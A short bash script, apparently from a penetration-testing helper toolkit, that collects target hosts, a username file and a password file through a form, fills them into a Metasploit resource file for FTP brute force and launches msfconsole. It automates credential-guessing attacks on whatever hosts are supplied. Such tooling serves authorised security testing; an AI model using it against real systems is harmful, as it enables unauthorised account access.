#!/bin/bash

: '
hydra: bruteforce username file and passwords file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
RHOSTS_FIELD=$(form_item  "RHOSTS" "rhosts")
USER_FILE_FIELD=$(form_item  "USER_FILE" "user_file")
PASS_FILE_FIELD=$(form_item  "PASS_FILE" "pass_file")

# Generate GUI form
generate_form "${RHOSTS_FIELD}" "${USER_FILE_FIELD}" "${PASS_FILE_FIELD}"

RHOSTS=${form_data["rhosts"]}
USER_FILE=${form_data["user_file"]}
PASS_FILE=${form_data["pass_file"]}

FILES_FOLDER="${SCRIPTS_DIR}/ftp/.files"

# Define replacement fields
REPLACE_FIELDS=(
    "[USER_FILE]" "${USER_FILE}"
    "[PASS_FILE]" "${PASS_FILE}"
    "[RHOSTS]" "${RHOSTS}"
)

find_and_replace_file "${FILES_FOLDER}" "ftp_brute_force_userfile_passfile.rc" "${REPLACE_FIELDS[@]}"

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return
